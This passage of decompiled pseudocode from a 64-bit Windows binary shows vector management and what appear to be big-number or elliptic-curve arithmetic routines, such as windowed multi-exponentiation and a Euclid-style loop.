  v9 = a1[2] - *a1;
  result = (unsigned __int64)((unsigned __int128)(v9 * (__int128)0x2AAAAAAAAAAAAAABi64) >> 64) >> 63;
  v11 = v9 / 48;
  if ( a2 <= v9 / 48 )
  {
    if ( a2 <= v8 )
    {
      if ( a2 != v8 )
      {
        v14 = v7 + 48 * a2;
        for ( i = (__int64 (__fastcall ***)(_QWORD, _QWORD))v14; i != (__int64 (__fastcall ***)(_QWORD, _QWORD))v6; i += 6 )
          result = (**i)(i, 0i64);
        a1[1] = v14;
      }
    }
    else
    {
      result = sub_13F134BB0(a3, v6, a2 - v8);
      a1[1] = result;
    }
  }
  else
  {
    if ( a2 > 0x555555555555555i64 )
      sub_13F10D1F0();
    v12 = v11 >> 1;
    if ( v11 <= 0x555555555555555i64 - (v11 >> 1) )
    {
      v13 = v12 + v11;
      if ( v12 + v11 < a2 )
        v13 = a2;
    }
    else
    {
      v13 = a2;
    }
    v16 = sub_13F1360D0((__int64)a1, v13);
    sub_13F134BB0(a3, v16 + 48 * v8, a2 - v8);
    sub_13F1345A0(*a1, a1[1], v16);
    return sub_13F135BB0((__int64)a1, v16, a2, v13);
  }
  return result;
}

//----- (000000013F1345A0) ----------------------------------------------------
__int64 __fastcall sub_13F1345A0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 i; // rbx

  for ( i = a1; i != a2; i += 48i64 )
  {
    sub_13F112A00(a3, i);
    a3 += 48i64;
  }
  return a3;
}

//----- (000000013F134610) ----------------------------------------------------
__int64 __fastcall sub_13F134610(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax

  sub_13F112A00(a2, a3);
  sub_13F112A00(a2 + 48, a3 + 48);
  *(_DWORD *)(a2 + 96) = *(_DWORD *)(a3 + 96);
  *(_DWORD *)(a2 + 100) = *(_DWORD *)(a3 + 100);
  *(_DWORD *)(a2 + 104) = *(_DWORD *)(a3 + 104);
  *(_BYTE *)(a2 + 108) = *(_BYTE *)(a3 + 108);
  *(_BYTE *)(a2 + 109) = *(_BYTE *)(a3 + 109);
  *(_BYTE *)(a2 + 110) = *(_BYTE *)(a3 + 110);
  result = *(unsigned __int8 *)(a3 + 111);
  *(_BYTE *)(a2 + 111) = result;
  return result;
}

//----- (000000013F134690) ----------------------------------------------------
unsigned __int64 *__fastcall sub_13F134690(unsigned __int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  unsigned __int64 v4; // rsi
  __int64 v5; // rcx
  __int64 v6; // rax
  __int64 v7; // rcx
  unsigned __int64 v8; // rax
  _QWORD *v9; // rax

  v2 = a2;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( a2 )
  {
    if ( a2 > 0xAAAAAAAAAAAAAAAi64 )
      sub_13F10D1F0();
    v4 = 24 * a2;
    if ( 24 * a2 < 0x1000 )
    {
      if ( v4 )
        v8 = sub_13F14059C(24 * a2);
      else
        v8 = 0i64;
    }
    else
    {
      v5 = v4 + 39;
      if ( v4 + 39 <= v4 )
        v5 = -1i64;
      v6 = sub_13F14059C(v5);
      v7 = v6;
      if ( !v6 )
        sub_13F1682C0();
      v8 = (v6 + 39) & 0xFFFFFFFFFFFFFFE0ui64;
      *(_QWORD *)(v8 - 8) = v7;
    }
    *a1 = v8;
    a1[1] = v8;
    v9 = (_QWORD *)*a1;
    for ( a1[2] = v4 + *a1; v2; --v2 )
    {
      *v9 = 0i64;
      v9[1] = 0i64;
      v9[2] = 0i64;
      v9 += 3;
    }
    a1[1] = (unsigned __int64)v9;
  }
  return a1;
}

//----- (000000013F134790) ----------------------------------------------------
__int64 *__fastcall sub_13F134790(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  __int64 v4; // rax
  __int64 v5; // rbx

  v2 = a2;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x555555555555555i64 )
      sub_13F10D1F0();
    v4 = sub_13F1360D0((__int64)a1, a2);
    *a1 = v4;
    a1[1] = v4;
    a1[2] = *a1 + 48 * v2;
    v5 = *a1;
    while ( v2 )
    {
      sub_13F112CF0(v5);
      v5 += 48i64;
      --v2;
    }
    a1[1] = v5;
  }
  return a1;
}

//----- (000000013F134840) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F134840(__int64 a1)
{
  _QWORD *v1; // rdi
  _QWORD *i; // rbx
  unsigned __int64 result; // rax

  v1 = *(_QWORD **)(a1 + 8);
  for ( i = *(_QWORD **)a1; i != v1; i += 14 )
    result = sub_13F134B20(i);
  return result;
}

//----- (000000013F134880) ----------------------------------------------------
__int64 __fastcall sub_13F134880(__int64 a1)
{
  __int64 (__fastcall ***v1)(_QWORD, _QWORD); // rdi
  __int64 (__fastcall ***i)(_QWORD, _QWORD); // rbx
  __int64 result; // rax

  v1 = *(__int64 (__fastcall ****)(_QWORD, _QWORD))(a1 + 8);
  for ( i = *(__int64 (__fastcall ****)(_QWORD, _QWORD))a1; i != v1; i += 6 )
    result = (**i)(i, 0i64);
  return result;
}

//----- (000000013F1348C0) ----------------------------------------------------
void __fastcall sub_13F1348C0(__int64 a1)
{
  _QWORD *v1; // rbx
  _QWORD *v3; // rsi
  unsigned __int64 v4; // rdx

  v1 = *(_QWORD **)a1;
  if ( *(_QWORD *)a1 )
  {
    v3 = *(_QWORD **)(a1 + 8);
    if ( v1 != v3 )
    {
      do
      {
        sub_13F134B20(v1);
        v1 += 14;
      }
      while ( v1 != v3 );
      v1 = *(_QWORD **)a1;
    }
    v4 = 112 * ((*(_QWORD *)(a1 + 16) - (_QWORD)v1) / 112i64);
    if ( v4 >= 0x1000 )
    {
      v4 += 39i64;
      if ( (unsigned __int64)v1 - *(v1 - 1) - 8 > 0x1F )
        sub_13F1682C0();
      v1 = (_QWORD *)*(v1 - 1);
    }
    sub_13F14088C(v1, v4);
    *(_QWORD *)a1 = 0i64;
    *(_QWORD *)(a1 + 8) = 0i64;
    *(_QWORD *)(a1 + 16) = 0i64;
  }
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F134990) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F134990(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  unsigned __int64 result; // rax
  void *v7; // rdx

  *a1 = off_13F188A20;
  v2 = 7i64;
  if ( a1[6] < a1[7] )
    v2 = 6i64;
  v3 = a1[v2];
  v4 = (void *)a1[8];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E550(v4);
  }
  v5 = 3i64;
  result = a1[3];
  if ( a1[2] < result )
    v5 = 2i64;
  v7 = (void *)a1[4];
  if ( v7 )
  {
    memset(v7, 0, 8i64 * a1[v5]);
    return sub_13F12E550(v7);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F188A20: using guessed type __int64 (__fastcall *off_13F188A20[2])();

//----- (000000013F134A30) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F134A30(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  unsigned __int64 result; // rax
  void *v7; // rdx

  *a1 = off_13F188A10;
  v2 = 10i64;
  if ( a1[9] < a1[10] )
    v2 = 9i64;
  v3 = a1[v2];
  v4 = (void *)a1[11];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  v5 = 4i64;
  result = a1[4];
  if ( a1[3] < result )
    v5 = 3i64;
  v7 = (void *)a1[5];
  if ( v7 )
  {
    memset(v7, 0, 8i64 * a1[v5]);
    return sub_13F12E4D0((__int64)v7);
  }
  return result;
}
// 13F188A10: using guessed type __int64 (__fastcall *off_13F188A10[2])();

//----- (000000013F134AD0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F134AD0(_QWORD *a1)
{
  __int64 v1; // rdx
  unsigned __int64 result; // rax
  __int64 v3; // r8
  void *v4; // rdx

  v1 = 2i64;
  result = a1[2];
  if ( a1[1] < result )
    v1 = 1i64;
  v3 = a1[v1];
  v4 = (void *)a1[3];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    return sub_13F12E550(v4);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F134B20) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F134B20(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  unsigned __int64 result; // rax
  void *v7; // rdx

  v2 = 9i64;
  if ( a1[8] < a1[9] )
    v2 = 8i64;
  v3 = a1[v2];
  v4 = (void *)a1[10];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  v5 = 3i64;
  result = a1[3];
  if ( a1[2] < result )
    v5 = 2i64;
  v7 = (void *)a1[4];
  if ( v7 )
  {
    memset(v7, 0, 8i64 * a1[v5]);
    return sub_13F12E4D0((__int64)v7);
  }
  return result;
}

//----- (000000013F134BB0) ----------------------------------------------------
__int64 __fastcall sub_13F134BB0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 i; // rsi

  v3 = a3;
  for ( i = *(_QWORD *)(a1 + 8); v3; --v3 )
  {
    sub_13F112A00(a2, i);
    a2 += 48i64;
  }
  return a2;
}

//----- (000000013F134C20) ----------------------------------------------------
_QWORD *__fastcall sub_13F134C20(_QWORD *a1, char a2)
{
  sub_13F134990(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 80i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F134C60) ----------------------------------------------------
_QWORD *__fastcall sub_13F134C60(_QWORD *a1, char a2)
{
  sub_13F134A30(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 112i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F134CA0) ----------------------------------------------------
__int64 __fastcall sub_13F134CA0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 *v9; // rax

  v9 = (__int64 *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 176i64))(a1);
  sub_13F134D00(v9, a2, a3, a4, a5, a6);
  return a2;
}

//----- (000000013F134D00) ----------------------------------------------------
__int64 __fastcall sub_13F134D00(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v8; // rbx
  unsigned int v10; // edi
  unsigned int v11; // eax
  __int64 v12; // rax
  int v13; // edi
  __int64 v14; // r13
  unsigned int v15; // er12
  __int64 v16; // rax
  bool v17; // zf
  __int64 v18; // rdi
  __int64 v19; // rax
  __int64 v20; // rax
  __int64 v21; // rdi
  __int64 v22; // rax
  unsigned int i; // ebx
  __int64 v24; // rdi
  __int64 v25; // rax
  unsigned int v26; // er14
  __int64 v27; // rax
  unsigned int v28; // esi
  __int64 v29; // rbx
  __int64 v30; // rax
  __int64 v31; // rbx
  int v32; // esi
  __int64 v33; // r14
  __int64 v34; // rdi
  __int64 v35; // rax
  unsigned int v36; // er14
  int v37; // eax
  __int64 v38; // rsi
  __int64 v39; // rbx
  __int64 v40; // rax
  unsigned int v41; // esi
  unsigned int v42; // edi
  unsigned int v43; // er14
  int j; // er12
  unsigned int v45; // er14
  int v46; // ebx
  __int64 v47; // rax
  __int64 v48; // rax
  unsigned __int64 v49; // rcx
  __int64 v50; // rdx
  char v52; // [rsp+28h] [rbp-69h]
  char v53; // [rsp+2Ch] [rbp-65h]
  unsigned int v54; // [rsp+30h] [rbp-61h]
  __int64 v55; // [rsp+38h] [rbp-59h]
  __int64 v56[3]; // [rsp+40h] [rbp-51h] BYREF
  int v57; // [rsp+58h] [rbp-39h]
  __int64 v58; // [rsp+60h] [rbp-31h]
  __int64 v59; // [rsp+68h] [rbp-29h]
  char v60[16]; // [rsp+70h] [rbp-21h] BYREF
  unsigned __int64 v61; // [rsp+80h] [rbp-11h]
  unsigned __int64 v62; // [rsp+88h] [rbp-9h]
  void *v63; // [rsp+90h] [rbp-1h]
  __int64 v64; // [rsp+A0h] [rbp+Fh]

  v64 = -2i64;
  v8 = a2;
  v57 = 0;
  v10 = sub_13F11BFE0(a6);
  v11 = sub_13F11BFE0(a4);
  if ( v11 < v10 )
    v11 = v10;
  v54 = v11;
  if ( v11 )
  {
    if ( v11 > 0x2E )
      v13 = (v11 > 0x104) + 2;
    else
      v13 = 1;
    v53 = v13;
    v14 = (unsigned int)(1 << v13);
    v15 = 1 << v13 << v13;
    v59 = v15;
    sub_13F134790(v56, v15);
    sub_13F113500(v56[0] + 48, a3);
    sub_13F113500(v56[0] + 48 * v14, a5);
    v16 = *a1;
    v17 = v13 == 1;
    v18 = v56[0];
    if ( v17 )
    {
      v19 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v16 + 24))(a1, a3, a5);
      sub_13F113500(v18 + 144, v19);
    }
    else
    {
      v20 = (*(__int64 (__fastcall **)(__int64 *, __int64))(v16 + 48))(a1, a3);
      sub_13F113500(v18 + 96, v20);
      v58 = 48i64 * (unsigned int)(2 * v14);
      v21 = v58 + v56[0];
      v22 = (*(__int64 (__fastcall **)(__int64 *, __int64))(*a1 + 48))(a1, a5);
      sub_13F113500(v21, v22);
      for ( i = 3; i < (unsigned int)v14; i += 2 )
      {
        v24 = v56[0] + 48i64 * i;
        v25 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(*a1 + 24))(
                a1,
                v56[0] + 48i64 * (i - 2),
                v56[0] + 96);
        sub_13F113500(v24, v25);
      }
      v26 = v14 + 1;
      v27 = ((unsigned int)(v14 - 2) >> 1) + 1;
      v55 = (unsigned int)v27;
      do
      {
        v28 = v26;
        if ( v26 < v15 )
        {
          do
          {
            v29 = v56[0] + 48i64 * v28;
            v30 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(*a1 + 24))(
                    a1,
                    v56[0] + 48i64 * (v28 - (unsigned int)v14),
                    a5);
            sub_13F113500(v29, v30);
            v28 += v14;
          }
          while ( v28 < v15 );
          v27 = v55;
        }
        v26 += 2;
        v55 = --v27;
      }
      while ( v27 );
      v31 = (unsigned int)(3 * v14);
      v32 = 2 * v14;
      if ( (unsigned int)v31 < v15 )
      {
        v33 = v58;
        do
        {
          v34 = v56[0] + 48 * v31;
          v35 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(*a1 + 24))(
                  a1,
                  v56[0] + 48i64 * (unsigned int)(v31 - v32),
                  v33 + v56[0]);
          sub_13F113500(v34, v35);
          v31 = (unsigned int)(v32 + v31);
        }
        while ( (unsigned int)v31 < v15 );
      }
      if ( (unsigned int)v14 < v15 )
      {
        v36 = 2 * v14;
        v37 = 2 - v14;
        do
        {
          v38 = v37 + v36;
          if ( (unsigned int)v38 < v36 )
          {
            do
            {
              v39 = v56[0] + 48 * v38;
              v40 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(*a1 + 24))(
                      a1,
                      v56[0] + 48i64 * (unsigned int)(v38 - 1),
                      a3);
              sub_13F113500(v39, v40);
              v38 = (unsigned int)(v38 + 2);
            }
            while ( (unsigned int)v38 < v36 );
            v15 = v59;
          }
          v36 += 2 * v14;
          v37 = 2 - v14;
        }
        while ( v36 - (unsigned int)v14 < v15 );
      }
    }
    sub_13F112CF0((__int64)v60);
    v41 = 0;
    v42 = 0;
    v43 = v54 - 1;
    v52 = 1;
    for ( j = v54 - 1; j >= 0; --j )
    {
      v41 = (unsigned __int8)sub_13F11EB30(a4, j) + 2 * v41;
      v42 = (unsigned __int8)sub_13F11EB30(a6, j) + 2 * v42;
      if ( !j || 2 * v41 >= (unsigned int)v14 || 2 * v42 >= (unsigned int)v14 )
      {
        v45 = v43 - j;
        v46 = 0;
        while ( (v41 || v42) && (((unsigned __int8)v41 | (unsigned __int8)v42) & 1) == 0 )
        {
          v41 >>= 1;
          v42 >>= 1;
          --v45;
          ++v46;
        }
        if ( v52 )
        {
          sub_13F113500((__int64)v60, v56[0] + 48i64 * (v41 + (v42 << v53)));
          v52 = 0;
        }
        else
        {
          for ( ; v45; --v45 )
          {
            v47 = (*(__int64 (__fastcall **)(__int64 *, char *))(*a1 + 48))(a1, v60);
            sub_13F113500((__int64)v60, v47);
          }
          if ( v41 || v42 )
            (*(void (__fastcall **)(__int64 *, char *, __int64))(*a1 + 64))(
              a1,
              v60,
              v56[0] + 48i64 * (v41 + (v42 << v53)));
        }
        for ( ; v46; --v46 )
        {
          v48 = (*(__int64 (__fastcall **)(__int64 *, char *))(*a1 + 48))(a1, v60);
          sub_13F113500((__int64)v60, v48);
        }
        v42 = 0;
        v41 = 0;
        v43 = j;
      }
    }
    v8 = a2;
    sub_13F112A00(a2, (__int64)v60);
    v57 = 1;
    v49 = v62;
    if ( v61 < v62 )
      v49 = v61;
    v50 = (__int64)v63;
    if ( v63 )
    {
      memset(v63, 0, 8 * v49);
      sub_13F12E4D0(v50);
    }
    sub_13F135E60((__int64)v56);
  }
  else
  {
    v12 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 16))(a1);
    sub_13F112A00(v8, v12);
  }
  return v8;
}

//----- (000000013F1351A0) ----------------------------------------------------
__int64 __fastcall sub_13F1351A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  sub_13F112CF0(a2);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64, int))(*(_QWORD *)a1 + 168i64))(a1, a2, a3, a4, 1);
  return a2;
}

//----- (000000013F135220) ----------------------------------------------------
__int64 __fastcall sub_13F135220(__int64 *a1, __int64 a2, __int64 a3)
{
  unsigned int v5; // er14
  unsigned int v6; // ebp
  unsigned int v7; // er15
  __int64 v8; // rbx
  __int64 v9; // rax
  __int128 *v10; // rdi
  __int64 v11; // rax
  unsigned int v12; // eax
  __int64 v13; // rbx
  __int64 v14; // rax
  __int64 v15; // rbx
  __int128 v17[3]; // [rsp+40h] [rbp-D8h] BYREF
  char v18[48]; // [rsp+70h] [rbp-A8h] BYREF
  char v19[48]; // [rsp+A0h] [rbp-78h] BYREF

  sub_13F112A00((__int64)v17, a3);
  sub_13F112A00((__int64)v18, a2);
  v5 = 1;
  sub_13F141160((__int64)v19, 48i64, 1i64);
  v6 = 0;
  v7 = 2;
  v8 = *a1;
  v9 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 16))(a1);
  if ( !(*(unsigned __int8 (__fastcall **)(__int64 *, char *, __int64))(v8 + 8))(a1, v18, v9) )
  {
    do
    {
      v10 = &v17[3 * v7];
      v11 = (*(__int64 (__fastcall **)(__int64 *, __int128 *, __int128 *))(*a1 + 192))(a1, &v17[3 * v6], &v17[3 * v5]);
      sub_13F113500((__int64)v10, v11);
      v12 = v6;
      v6 = v5;
      v5 = v7;
      v7 = v12;
      v13 = *a1;
      v14 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 16))(a1);
    }
    while ( !(*(unsigned __int8 (__fastcall **)(__int64 *, __int128 *, __int64))(v13 + 8))(a1, v10, v14) );
  }
  v15 = sub_13F113500((__int64)(a1 + 3), (__int64)&v17[3 * v6]);
  sub_13F140ECC((__int64)v17, 48i64, 3i64);
  return v15;
}
// 13F135220: using guessed type _OWORD var_D8[3];
// 13F135220: using guessed type char var_78[48];

//----- (000000013F135390) ----------------------------------------------------
__int64 __fastcall sub_13F135390(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  sub_13F112CF0(a2);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64, int))(*(_QWORD *)a1 + 96i64))(a1, a2, a3, a4, 1);
  return a2;
}

//----- (000000013F135410) ----------------------------------------------------
void __fastcall sub_13F135410(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5)
{
  __int64 *v8; // rax

  v8 = (__int64 *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 176i64))(a1);
  sub_13F135460(v8, a2, a3, a4, a5);
}

//----- (000000013F135460) ----------------------------------------------------
void __fastcall sub_13F135460(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5)
{
  __int64 v6; // r15
  unsigned int v8; // er12
  unsigned int v9; // esi
  _QWORD *v10; // r13
  char v11; // di
  __int64 (__fastcall *(**v12)[4])(); // rax
  unsigned int v13; // ecx
  unsigned __int64 v14; // rdx
  unsigned __int64 v15; // rcx
  __int64 v16; // rdx
  unsigned __int64 v17; // rcx
  __int64 v18; // rdx
  __int64 v19; // r15
  __int64 v20; // r12
  __int64 v21; // rdi
  unsigned int v22; // esi
  unsigned int v23; // ebx
  __int64 v24; // rdi
  __int64 v25; // rax
  unsigned __int64 v26; // rdx
  int v27; // edi
  char v28; // r12
  __int64 v29; // r15
  __int64 v30; // rdx
  __int64 v31; // rcx
  unsigned __int64 v32; // rbx
  __int64 v33; // rdi
  __int64 v34; // rax
  __int64 v35; // rdi
  unsigned int v36; // esi
  unsigned int v37; // ebx
  __int64 v38; // rax
  __int64 *v39; // r13
  __int64 v40; // r12
  __int64 v41; // rdi
  unsigned __int64 v42; // rdx
  int v43; // edx
  __int64 v44; // rbx
  __int64 v45; // rsi
  __int64 v46; // r15
  __int64 v47; // rdi
  __int64 v48; // rbx
  __int64 v49; // rax
  __int64 v50; // rax
  unsigned __int64 v51; // rcx
  __int64 v52; // rdx
  int v53; // [rsp+28h] [rbp-E0h]
  __int128 v54; // [rsp+30h] [rbp-D8h] BYREF
  __int64 v55; // [rsp+40h] [rbp-C8h]
  __int128 v56; // [rsp+48h] [rbp-C0h]
  __int64 v57; // [rsp+58h] [rbp-B0h]
  __int64 v58; // [rsp+60h] [rbp-A8h] BYREF
  unsigned __int64 v59; // [rsp+70h] [rbp-98h]
  unsigned __int64 v60; // [rsp+78h] [rbp-90h]
  void *v61; // [rsp+80h] [rbp-88h]
  char v62[16]; // [rsp+90h] [rbp-78h] BYREF
  unsigned __int64 v63; // [rsp+A0h] [rbp-68h]
  unsigned __int64 v64; // [rsp+A8h] [rbp-60h]
  void *v65; // [rsp+B0h] [rbp-58h]
  __int64 v66; // [rsp+C0h] [rbp-48h]
  int v67; // [rsp+C8h] [rbp-40h]
  char v68; // [rsp+CCh] [rbp-3Ch]
  __int16 v69; // [rsp+CDh] [rbp-3Bh]
  char v70; // [rsp+CFh] [rbp-39h]
  __int64 v71[3]; // [rsp+D0h] [rbp-38h] BYREF
  char v72[16]; // [rsp+E8h] [rbp-20h] BYREF
  unsigned __int64 v73; // [rsp+F8h] [rbp-10h]
  unsigned __int64 v74; // [rsp+100h] [rbp-8h]
  void *v75; // [rsp+108h] [rbp+0h]
  __int64 v76; // [rsp+118h] [rbp+10h]
  __int128 v77[4]; // [rsp+128h] [rbp+20h] BYREF
  __int64 v80; // [rsp+190h] [rbp+88h]

  v76 = -2i64;
  v6 = a3;
  v8 = a5;
  v57 = a5;
  sub_13F134690((unsigned __int64 *)v71, a5);
  v54 = 0i64;
  v55 = 0i64;
  if ( a5 )
    sub_13F135D10((__int64 *)&v54, a5);
  v9 = 0;
  v53 = 0;
  v10 = (_QWORD *)v71[0];
  if ( a4 )
  {
    do
    {
      if ( v9 >= v8 )
        break;
      v11 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 40))(a1);
      sub_13F112A00((__int64)&v58, a4);
      v12 = sub_13F120160();
      sub_13F112A00((__int64)v62, (__int64)v12);
      v66 = 0i64;
      v67 = 0;
      v68 = v11;
      v69 = 256;
      v70 = 0;
      v13 = sub_13F11BFE0((__int64)&v58);
      if ( v13 > 0x11 )
      {
        if ( v13 > 0x18 )
        {
          if ( v13 > 0x46 )
          {
            if ( v13 > 0xC5 )
            {
              if ( v13 > 0x21B )
              {
                LODWORD(v66) = (v13 > 0x59A) + 6;
                v14 = (v13 > 0x59A) + 6i64;
              }
              else
              {
                LODWORD(v66) = 5;
                v14 = 5i64;
              }
            }
            else
            {
              LODWORD(v66) = 4;
              v14 = 4i64;
            }
          }
          else
          {
            LODWORD(v66) = 3;
            v14 = 3i64;
          }
        }
        else
        {
          LODWORD(v66) = 2;
          v14 = 2i64;
        }
      }
      else
      {
        LODWORD(v66) = 1;
        v14 = 1i64;
      }
      sub_13F114170((__int64)v62, v14);
      if ( v55 == *((_QWORD *)&v54 + 1) )
      {
        sub_13F134290((__int64 *)&v54, *((__int64 *)&v54 + 1), (__int64)&v58);
      }
      else
      {
        sub_13F134610((__int64)&v54, *((__int64 *)&v54 + 1), (__int64)&v58);
        *((_QWORD *)&v54 + 1) += 112i64;
      }
      v80 = a4 + 48;
      v15 = v64;
      if ( v63 < v64 )
        v15 = v63;
      v16 = (__int64)v65;
      if ( v65 )
      {
        memset(v65, 0, 8 * v15);
        sub_13F12E4D0(v16);
      }
      v17 = v60;
      if ( v59 < v60 )
        v17 = v59;
      v18 = (__int64)v61;
      if ( v61 )
      {
        memset(v61, 0, 8 * v17);
        sub_13F12E4D0(v18);
      }
      v19 = v9;
      v20 = 112i64 * v9;
      v21 = v20 + v54;
      v22 = (unsigned int)sub_13F123630(v20 + v54) << 6;
      v23 = *(_BYTE *)(v21 + 110) ? 0 : *(_DWORD *)(v21 + 96);
      *(_BYTE *)(v21 + 110) = 0;
      if ( sub_13F11EB30(v21, v23) )
      {
LABEL_33:
        sub_13F114080(v21, v23);
        *(_DWORD *)(v21 + 100) += v23;
        *(_DWORD *)(v21 + 104) = sub_13F11FDF0(v21, 1i64 << *(_DWORD *)(v21 + 96));
        if ( *(_BYTE *)(v21 + 108) && sub_13F11EB30(v21, *(unsigned int *)(v21 + 96)) )
        {
          *(_BYTE *)(v21 + 109) = 1;
          *(_DWORD *)(v21 + 104) = (1 << *(_DWORD *)(v21 + 96)) - *(_DWORD *)(v21 + 104);
          sub_13F113F60(v21, v21 + 48);
        }
        else
        {
          *(_BYTE *)(v21 + 109) = 0;
        }
      }
      else
      {
        while ( v23 < v22 )
        {
          if ( sub_13F11EB30(v21, ++v23) )
            goto LABEL_33;
        }
        *(_BYTE *)(v21 + 111) = 1;
      }
      v24 = v54;
      v25 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 16))(a1);
      v26 = 1i64 << ((unsigned __int8)*(_DWORD *)(v24 + v20 + 96) - 1);
      *(_QWORD *)&v56 = &v10[3 * v19];
      *((_QWORD *)&v56 + 1) = v25;
      v77[0] = v56;
      sub_13F134410((__int64 *)v56, v26, (__int64)v77);
      v9 = ++v53;
      a4 = v80;
      v8 = a5;
    }
    while ( v80 );
    v6 = a3;
  }
  v27 = 0;
  v53 = 0;
  sub_13F112A00((__int64)v72, v6);
  while ( 1 )
  {
    v28 = 0;
    if ( !a5 )
      break;
    v29 = 0i64;
    v30 = v57;
    *(_QWORD *)&v56 = v57;
    do
    {
      v31 = v29 + v54;
      if ( !*(_BYTE *)(v29 + v54 + 111) && v27 == *(_DWORD *)(v31 + 100) )
      {
        v32 = *v10 + 48 * ((unsigned __int64)*(unsigned int *)(v31 + 104) >> 1);
        if ( *(_BYTE *)(v31 + 109) )
        {
          v33 = *a1;
          v34 = (*(__int64 (__fastcall **)(__int64 *, char *))(*a1 + 32))(a1, v72);
          (*(void (__fastcall **)(__int64 *, unsigned __int64, __int64))(v33 + 64))(a1, v32, v34);
        }
        else
        {
          (*(void (__fastcall **)(__int64 *, unsigned __int64, char *))(*a1 + 64))(a1, v32, v72);
        }
        v35 = v29 + v54;
        v36 = (unsigned int)sub_13F123630(v29 + v54) << 6;
        if ( *(_BYTE *)(v35 + 110) )
          v37 = 0;
        else
          v37 = *(_DWORD *)(v35 + 96);
        *(_BYTE *)(v35 + 110) = 0;
        if ( sub_13F11EB30(v35, v37) )
        {
LABEL_54:
          sub_13F114080(v35, v37);
          *(_DWORD *)(v35 + 100) += v37;
          *(_DWORD *)(v35 + 104) = sub_13F11FDF0(v35, 1i64 << *(_DWORD *)(v35 + 96));
          if ( *(_BYTE *)(v35 + 108) && sub_13F11EB30(v35, *(unsigned int *)(v35 + 96)) )
          {
            *(_BYTE *)(v35 + 109) = 1;
            *(_DWORD *)(v35 + 104) = (1 << *(_DWORD *)(v35 + 96)) - *(_DWORD *)(v35 + 104);
            sub_13F113F60(v35, v35 + 48);
          }
          else
          {
            *(_BYTE *)(v35 + 109) = 0;
          }
        }
        else
        {
          while ( v37 < v36 )
          {
            if ( sub_13F11EB30(v35, ++v37) )
              goto LABEL_54;
          }
          *(_BYTE *)(v35 + 111) = 1;
        }
        v30 = v56;
        v27 = v53;
      }
      if ( v28 || !*(_BYTE *)(v29 + v54 + 111) )
        v28 = 1;
      v10 += 3;
      v29 += 112i64;
      *(_QWORD *)&v56 = --v30;
    }
    while ( v30 );
    if ( !v28 )
    {
      v39 = (__int64 *)v71[0];
      do
      {
        v40 = a2;
        a2 += 48i64;
        sub_13F113500(v40, 48 * ((v39[1] - *v39) / 48) + *v39 - 48);
        v41 = *v39;
        v42 = (v39[1] - *v39) / 48;
        if ( v42 > 1 )
        {
          v43 = v42 - 2;
          if ( v43 >= 1 )
          {
            v44 = 48i64 * v43;
            v45 = 48i64 * (v43 + 1);
            v46 = (unsigned int)v43;
            do
            {
              (*(void (__fastcall **)(__int64 *, __int64, __int64))(*a1 + 64))(a1, *v39 + v44, *v39 + v45);
              (*(void (__fastcall **)(__int64 *, __int64, __int64))(*a1 + 64))(a1, v40, v44 + *v39);
              v45 -= 48i64;
              v44 -= 48i64;
              --v46;
            }
            while ( v46 );
            v41 = *v39;
          }
